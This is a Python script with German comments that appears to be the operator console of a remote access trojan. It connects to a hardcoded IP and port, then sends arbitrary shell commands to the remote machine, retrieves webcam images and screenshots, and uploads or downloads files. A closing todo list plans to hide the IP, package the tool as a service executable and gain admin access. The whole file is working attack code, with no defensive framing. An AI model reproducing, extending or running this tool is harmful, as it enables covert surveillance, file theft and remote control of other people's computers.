import socket
import os

try:
    os.system('cls')
except:
    os.system('clear')

HOST = '79.222.26.104'  # ip zu der die connection hergestellt werden soll
PORT = 3003

print("$ Warten auf Verbindung auf Port: " + str(PORT))

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        break
    except:
        pass

print("$ Verbindung hergestellt")
ops = s.recv(256)
print("$ Operating System : " + str(ops, "utf8"))


def cam():
    picsi = s.recv(256)
    if "error" not in str(picsi, "utf8"):
        picsize = int(str(picsi, "utf8"))
        picdata = s.recv(picsize)
        pic = open("cam.png", "wb")
        pic.write(picdata)
        pic.flush()
        pic.close()
        picob = s.recv(256)
        print(str(picob, "utf8"))
    else:
        print("ERROR")


def screenshot():
    picsi = s.recv(256)
    if "error" not in str(picsi, "utf8"):
        picsize = int(str(picsi, "utf8"))
        picdata = s.recv(picsize)
        pic = open("screenshot.png", "wb")
        pic.write(picdata)
        pic.flush()
        pic.close()
        picob = s.recv(256)
        print(str(picob, "utf8"))
    else:
        print("ERROR")


def put(befehl):
    bef = befehl.split(" ")
    pfilename = bef[1]
    if os.path.isfile(pfilename):
        pfile = open(pfilename, "rb")
        pdata = pfile.read()
        pfile.close()
        psize = os.path.getsize(pfilename)
        s.send(bytes(str(psize), "utf8"))
        s.send(pdata)
        pob = s.recv(256)
        print(str(pob, "utf8"))
    else:
        print("File does not exist")


def get(befehl):
    bef = befehl.split(" ")
    gfilename = bef[1]
    gsi = s.recv(256)
    if "error" not in str(gsi, "utf8"):
        gsize = int(str(gsi, "utf8"))
        gdata = s.recv(gsize)
        gfile = open(str(gfilename), "wb")
        gfile.write(gdata)
        gfile.flush()
        gfile.close()
        gob = s.recv(256)
        print(str(gob, "utf8"))
    else:
        print("File does not exist")


def command():
    while True:
        befehl = input("$ " + HOST + " >> ")

        if befehl == "quit" or befehl == "exit":
            s.send("quit".encode("utf8", errors='replace'))
            s.close()
            break

        elif befehl.startswith("put "):
            s.send(str(befehl).encode("utf8", errors='replace'))
            put(befehl)

        elif befehl.startswith("get "):
            s.send(str(befehl).encode("utf8", errors='replace'))
            get(befehl)

        elif befehl == "cam":
            s.send(str(befehl).encode("utf8", errors='replace'))
            cam()

        elif befehl == "screenshot":
            s.send(str(befehl).encode("utf8", errors='replace'))
            screenshot()

        elif befehl == "":
            pass

        else:
            s.send(befehl.encode("utf8", errors='replace'))
            output = s.recv(1000000)
            print(output.decode("utf8", errors='replace'))


command()


''' Todo:
    ip Verschlüsselung
    Als Dienst erstellen(exe)
    Adminzugriff
'''
